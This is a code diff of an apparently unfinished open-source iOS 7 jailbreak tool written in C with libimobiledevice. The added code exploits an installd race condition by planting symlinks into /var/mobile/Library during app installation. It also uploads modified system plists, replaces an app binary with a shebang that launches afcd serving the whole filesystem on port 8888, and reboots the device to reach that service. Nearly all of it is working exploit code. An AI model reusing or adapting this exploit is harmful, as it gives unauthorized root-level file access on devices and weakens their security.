@@ -20,11 +20,15 @@
 #include <libimobiledevice/installation_proxy.h>
 #include <libimobiledevice/file_relay.h>
 #include <libimobiledevice/mobilebackup2.h>
+#include <libimobiledevice/diagnostics_relay.h>
+
+
 
 uint64_t gFh = 0;
 unsigned int cb = 0;
 unsigned int installError = 0;
 unsigned int installing = 1;
+int exploit;
 
 char *udid;
 char **list = NULL;
@@ -36,6 +40,7 @@ afc_client_t gAfc = NULL;
 lockdownd_client_t gLockdown = NULL;
 instproxy_client_t gInstproxy = NULL;
 file_relay_client_t gFrc = NULL;
+diagnostics_relay_client_t gDiag = NULL;
 mobilebackup2_client_t gMb = NULL;
 instproxy_error_t ie = 0;
 instproxy_client_t instproxy = NULL;
@@ -43,11 +48,12 @@ instproxy_client_t instproxy = NULL;
 lockdownd_error_t lderr = 0;
 lockdownd_service_descriptor_t port = NULL;
 afc_error_t afcerr = 0;
+diagnostics_relay_error_t diagerr = 0;
+
 
 char fooS[60];
 char fooSOld[60];
 char fooSNew[60];
-
 
 void printSplash(void) {
 	// uses colour macros in breakout.h
@@ -56,7 +62,7 @@ void printSplash(void) {
 	printf("%sopen-source", KGRN);
 	printf(" %siOS 7 jailbreak.\n", KNRM);
 	printf(" [*] by your friendly neighbourhood hustler, ");
-	printf("%sDarkMalloc%s.\n\n", KGRN, KNRM);
+	printf("%sDarkMalloc%s and %stihmstar%s.\n\n", KGRN, KNRM,KRED,KNRM);
 }
 
 int afc_send_file(afc_client_t afc, const char* local, const char* remote) {
@@ -299,9 +305,9 @@ afc_error_t afc_receive_file(afc_client_t afc, const char* remote,
 	return err;
 }
 
-void minst_cb(const char *operation, plist_t status, int exploit) {
+void minst_cb(const char *operation, plist_t status, int *unused) {
 	cb++;
-	if (cb == 1 && exploit == 1) {
+	if (cb == 1) {
 		afc_read_directory(gAfc, "tmp/", &list);
 		if (list) {
 			while (list[0]) {
@@ -315,15 +321,24 @@ void minst_cb(const char *operation, plist_t status, int exploit) {
 					}
 					list++;
 			}
-		}
-        
+        }
+	}
+    
+    if (cb == 1 && exploit >= 1) {
         //@DarkMalloc THIS is where racecondition has to be exploited :P
         snprintf(fooS,50, "tmp/%s/foo_extracted", stagingString);
         snprintf(fooSOld,50, "tmp/%s/foo_extracted.old", stagingString);
         snprintf(fooSNew,50, "tmp/%s/foo_extracted.new", stagingString);
         printf(" [*] Injection vector found - ");
 		printf("Injecting exploit...\n");
-        deviceSymlink("../../..//var/mobile/Library/Caches/", fooSNew);
+        
+        if (exploit == 2) {
+            deviceSymlink("../../..//var/mobile/Library/Preferences/", fooSNew);
+        }else {
+            deviceSymlink("../../..//var/mobile/Library/Caches/", fooSNew);
+        }
+        
+        
         afcerr = afc_rename_path(gAfc, fooS, fooSOld);
         if (afcerr != AFC_E_SUCCESS) {
             printf("%s [*] Could not rename %s -> %s %s\n\n", KRED, fooS,fooSOld, KNRM);
@@ -332,7 +347,7 @@ void minst_cb(const char *operation, plist_t status, int exploit) {
         if (afcerr != AFC_E_SUCCESS) {
             printf("%s [*] Could not rename foo.new -> foo%s\n\n", KRED, KNRM);
         }
-	}
+    }
 	
 	if (status && operation) {
 		plist_t npercent = plist_dict_get_item(status, "PercentComplete");
@@ -369,11 +384,9 @@ void minst_cb(const char *operation, plist_t status, int exploit) {
 
 int deviceConnect() {
 	// attempt to connnect to device (using libimobiledevice)...
-	printf(" [*] Attempting to connect to device...\n");
 	idevice_error_t ideverr = 0;
 	ideverr = idevice_new(&gDevice, NULL);
 	if (ideverr != IDEVICE_E_SUCCESS) {
-		printf("%s [*] Unable to connect to device. Check your device is plugged in and turned on.%s\n\n", KRED, KNRM);
 		return -1;
 	}
 	
@@ -423,24 +436,25 @@ int connectAFC() {
 		idevice_free(gDevice);
 		return -1;
 	}
-	
-	lockdownd_client_free(gLockdown);
-	gLockdown = NULL;
-	
 	printf("%s [*] Successfully created new AFC client!%s\n\n", KGRN, KNRM);
 	return 0;
 }
 
-void performSanityChecks() {
+void performSanityChecks() { //this doesnt work at all :(
 	// just in case Breakout has been run before, we don't want any issues arising from old/new files.
 	printf(" [*] Performing sanity checks...\n");
 		
-	afcerr = afc_read_directory(gAfc, "/Downloads/WWDC.app", NULL);
+	afcerr = afc_read_directory(gAfc, "/Downloads/WWDC.app", &list);
 	if (afcerr != AFC_E_SUCCESS) {
-		afc_remove_path(gAfc, "/Downloads/WWDC.app");
+		afc_remove_path(gAfc, "/Downloads/WWDC.app/");
+	}
+
+    afcerr = afc_read_directory(gAfc, "/Downloads/a", &list);
+	if (afcerr != AFC_E_SUCCESS) {
+        afc_remove_path(gAfc, "/Downloads/a");
 	}
 	
-	afcerr = afc_read_directory(gAfc, "/Breakout-Install", NULL);
+	afcerr = afc_read_directory(gAfc, "/Breakout-Install", &list);
 	if (afcerr != AFC_E_SUCCESS) {
 		afc_remove_path(gAfc, "/Breakout-Install");
 	}
@@ -543,14 +557,15 @@ int startInstallationProxy() {
 	return 0;
 }
 
-int installIPA(char *ipaLocation, int exploit) {
+int installIPA(char *ipaLocation, int explt) {
 	// installs our modified ipa for us, thanks installd
 	printf(" [*] Requesting installation proxy to install custom app...\n");
-	
+	cb =0;
     plist_t opts = instproxy_client_options_new();
-	ie = instproxy_install(instproxy, ipaLocation, opts, &minst_cb, exploit);
+    exploit = explt;
+	ie = instproxy_install(instproxy, ipaLocation, opts, &minst_cb, NULL);
 	if (ie != INSTPROXY_E_SUCCESS && exploit != 1) {
-		printf("%s [*] Installation proxy could not install app. Please reboot your device and try again.%s\n\n", KRED, KNRM);
+		printf("%s [*] Installation proxy could not install app %d. Please reboot your device and try again.%s\n\n", KRED, ie, KNRM);
 		instproxy_client_options_free(opts);
 		instproxy_client_free(instproxy);
 		return -1;
@@ -564,6 +579,14 @@ int installIPA(char *ipaLocation, int exploit) {
 		return -1;
 	}
 	
+    printf(" [*] Cleaning up instproxy \n");
+    instproxy_client_options_free(opts);
+    instproxy_client_free(instproxy);
+    
+    opts = NULL;
+    instproxy = NULL;
+    
+    
 	printf("%s [*] Installation proxy successfully installed app!%s\n\n", KGRN, KNRM);
 	return 0;
 }
@@ -598,7 +621,7 @@ int accessTmpHax() {
 	}
 	
 	// check if we actually have access to /tmp
-	char **list = NULL;
+	list = NULL;
 	afcerr = afc_read_directory(gAfc, "tmp/", &list);
 	if (list == NULL) {
 		printf("%s [*] Could not get access to /tmp. Please reboot your device and try again.%s\n\n", KRED, KNRM);
@@ -616,7 +639,7 @@ int placeShebang() {
 	uint32_t bw = 0;
 	afc_file_open(gAfc, "Downloads/WWDC.app/WWDC", AFC_FOPEN_RW, &gFh);
 	afc_file_truncate(gAfc, gFh, 0);
-	char *shebang = "#!/usr/libexec/afcd -S -p 2221 -d /\n";
+	char *shebang = "#!/usr/libexec/afcd -S -p 8888 -d /\n";
 	afc_file_write(gAfc, gFh, shebang, strlen(shebang) -1, &bw);
 	if (bw > 0) {
 		printf("%s [*] Successfully replaced binary with shebang!%s\n\n", KGRN, KNRM);
@@ -653,12 +676,6 @@ int startFileRelay() {
 		return -1;
 	}
 	printf("%s [*] Successfully started file_relay service!%s\n\n", KGRN, KNRM);
-	
-	// close connection to lockdownd, we can reconnect later.
-	if (gLockdown) {
-		lockdownd_client_free(gLockdown);
-		gLockdown = NULL;
-	}
 	
 	file_relay_error_t frcerr = 0;
 	
@@ -730,7 +747,9 @@ int grabCaches() {
 int putCaches() {
 	
 	printf(" [*] Packing Caches\n");
+    system("cp resources/com.apple.backboardd.plist . > /dev/null");
 	system("zip -m -r resources/pkg.zip com.apple.mobile.installation.plist com.apple.LaunchServices*.csstore > /dev/null");
+	system("zip -m -r resources/pkg2.zip com.apple.backboardd.plist > /dev/null");
 	
 	printf(" [*] Copying Caches via afc\n");
 
@@ -739,28 +758,116 @@ int putCaches() {
 		printf("%s [*] Unable to upload pkg.zip. Please reboot your device and try again.%s\n\n", KRED, KNRM);
 		return -1;
 	}
+    printf("%s [*] Successfully uploaded pkg.zip !%s\n", KGRN, KNRM);
+    afcerr = afc_send_file(gAfc, "resources/pkg2.zip", "Breakout-Install/pkg2.zip");
+	if (afcerr != AFC_E_SUCCESS) {
+		printf("%s [*] Unable to upload pkg2.zip. Please reboot your device and try again.%s\n\n", KRED, KNRM);
+		return -1;
+	}
+    printf("%s [*] Successfully uploaded pkg2.zip !%s\n\n", KGRN, KNRM);
 	
 	// we don't need this anymore, clear it.
 	system("rm -rf resources/pkg.zip > /dev/null");
+	system("rm -rf resources/pkg2.zip > /dev/null");
 	
-	printf("%s [*] Successfully uploaded pkg.zip !%s\n\n", KGRN, KNRM);
 	return 0;
 	
 }
 
+int rebootDevice(){
+    printf(" [*] Attempting to reboot the device ...\n");
+    if (startLockdownd() != 0) {
+        printf("%s [*] Error starting Lockdownd %s\n",KRED,KNRM);
+		return -1;
+	}
 
+	lderr = lockdownd_start_service(gLockdown, "com.apple.mobile.diagnostics_relay", &port);
+	if (lderr != LOCKDOWN_E_SUCCESS) {
+		printf("%s [*] Error starting diags service%s\n", KRED, KNRM);
+		return -1;
+	}
+	
+	diagerr = diagnostics_relay_client_new(gDevice, port, &gDiag);
+	if (diagerr != DIAGNOSTICS_RELAY_E_SUCCESS) {
+		printf("%s [*] Error creating diags client\n%s",KRED,KNRM);
+		lockdownd_client_free(gLockdown);
+		idevice_free(gDevice);
+		return -1;
+	}
+	
+	diagerr = diagnostics_relay_restart(gDiag, DIAGNOSTICS_RELAY_ACTION_FLAG_DISPLAY_PASS);
+	if (diagerr != DIAGNOSTICS_RELAY_E_SUCCESS && diagerr != -2) {
+		printf("%s [*] Error rebooting\n%s",KRED,KNRM);
+		lockdownd_client_free(gLockdown);
+		idevice_free(gDevice);
+		return -1;
+	}
+    //give it time to disconnect, before trying to reconnect
+    printf(" [*] Rebooting device ...\n");
+    sleep(30);
+
+    return 0;
+}
+
+int connectAFCHack(int tapIcon){
+    
+    // start lockdownd client.
+	if (startLockdownd() != 0) {
+		return -1;
+	}
+	
+	// start AFC service on lockdownd to create port struct
+	if (startAFC() != 0) {
+		return -1;
+	}
+    if (freeLockdown() != 0) {
+		return -1;
+	}
+    
+    //starting AFCHack client
+    printf(" [*] Waiting for AFCHack service ...\n");
+    if (tapIcon == 1) {
+        printf(" [*] Please tap the \"Breakout\" icon to continue ...\n");
+    }
+    port->port = 8888;
+    while (1) {
+        afcerr = afc_client_new(gDevice, port, &gAfc);
+        if (!(afcerr != AFC_E_SUCCESS)) {
+            break;
+        }
+        sleep(3);
+    }
+    printf("%s [*] Successfully connected to AFCHack client %s\n\n",KGRN,KNRM);
+    
+
+    
+    return 0;
+}
+
+int freeLockdown() {
+    printf(" [*] Freeing Lockdownd\n\n");
+    lderr = lockdownd_client_free(gLockdown);
+    if (lderr != LOCKDOWN_E_SUCCESS){
+        printf("%s [*] Error freeing lockdownd %d %s\n",KRED,lderr,KNRM);
+    }
+	gLockdown = NULL;
+    return 0;
+}
 
 
 int main(int argc, char *argv[]) {
 	
 	// let's clean this up a little bit.
 	printSplash();
-	
+   
+    
 	// attempt to connnect to device (using libimobiledevice)...
+    printf(" [*] Attempting to connect to device...\n");
 	if (deviceConnect() != 0) {
+        printf("%s [*] Unable to connect to device. Check your device is plugged in and turned on.%s\n\n", KRED, KNRM);
 		return -1;
 	}
-	
+     
 	// start lockdownd client.
 	if (startLockdownd() != 0) {
 		return -1;
@@ -770,15 +877,18 @@ int main(int argc, char *argv[]) {
 	if (startAFC() != 0) {
 		return -1;
 	}
-	
+    if (freeLockdown() != 0) {
+		return -1;
+	}
 	// create an AFC client and connect to AFC service.
 	if (connectAFC() != 0) {
 		return -1;
 	}
 		
 	// just in case Breakout has been run before, we don't want any issues arising from old/new files.
-	performSanityChecks();
-		
+	performSanityChecks(); //this doesnt work at all :(                                            ####
+	
+    
 	// create our storage dir and upload requires files etc.	
 	if (preflightBreakout() != 0) {
 		return -1;
@@ -796,7 +906,7 @@ int main(int argc, char *argv[]) {
 	if (uploadBreakout() != 0) {
 		return -1;
 	}
-	
+    
 	// reconnect to lockdownd
 	if (startLockdownd() != 0) {
 		return -1;
@@ -806,12 +916,13 @@ int main(int argc, char *argv[]) {
 	if (startInstallationProxy() != 0) {
 		return -1;
 	}
-	
+    //lockdownd already freed here
+    
 	// install custom (breakout) ipa
-
-	///////////////if (installIPA("Breakout-Install/breakout.ipa",0) != 0) {
-	///////////////	return -1;
-	///////////////}
+    
+	if (installIPA("Breakout-Install/breakout.ipa",0) != 0) {
+		return -1;
+	}
 
 	// get access to /tmp, we need this
 	if (accessTmpHax() != 0) {
@@ -836,31 +947,51 @@ int main(int argc, char *argv[]) {
 	if (startFileRelay() != 0) {
 		return -1;
 	}
-	
+    if (freeLockdown() != 0) {
+		return -1;
+	}
+    
 	if (grabCaches() != 0) {
 		return -1;
 	}
 
 	
-	//you need to modify the caches and add the values here
+	//you need to modify the caches and add the values here                              ####
+	//                                                                                   ####
 	//
-	//
-    
-    
-	if (putCaches() != 0) {
+
+    if (putCaches() != 0) {
 		return -1;
 	}
-	
-	
-	//race condition exploit :P
-	printf(" [*] Trying to exploit race condition\n");
 
-	
+	//race condition exploit :P
+     //you need to fix minst_cb not called second time                                   ####
+     //that means you acn either inject breakout.ipa or exploit race condition :(        ####
+	printf(" [*] Trying to exploit race condition (1/2)\n");
 	if (installIPA("Breakout-Install/pkg.zip",1) !=0){
 		return -1;
 	}
+    printf(" [*] Trying to exploit race condition (2/2)\n");
+	if (installIPA("Breakout-Install/pkg.zip",2) !=0){
+		return -1;
+	}
+    //rebooting
+    if (rebootDevice() != 0) {
+        printf("%s [*] Error rebooting device, please disconnect, reboot manually and reconnect\n%s",KRED,KNRM);
+        sleep(20);
+    }
+    
+
+    printf(" [*] Waiting for the device to reconnect...\n");
+	while (deviceConnect() != 0) {
+		sleep(1);
+	}
+	printf(" [*] Device found! Continuing\n\n");
+
 	
-	
+	//connect to hack afcd
+    connectAFCHack(1);
+    
 	
 	// obviously there's a lot more to implement.
 	
